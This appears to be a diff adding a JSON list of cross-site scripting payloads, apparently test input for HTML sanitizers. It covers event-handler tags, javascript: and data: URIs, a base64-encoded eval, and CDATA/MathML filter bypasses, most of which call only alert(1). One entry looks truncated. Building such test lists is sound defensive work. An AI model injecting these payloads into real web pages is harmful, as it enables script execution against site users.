@@ -1,0 +1,12 @@
+[
+  "<svg/onload=alert(1)>",
+  "<img src=x onerror=alert(1)>",
+  "<body onload=alert(1)>",
+  "<iframe src='javascript:alert(1)'></iframe>",
+  "<script>eval(atob('YWxlcnQoMSk='))</script>",
+  "<svg><script>alert(1)</script></svg>",
+  "<script src=data:text/javascript,alert(1)>",
+  "<img src='x' onerror='window '>",
+  "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
+  "<math><mi//xlink:href='data:x,<script>alert(1)</script>'></math>"
+]
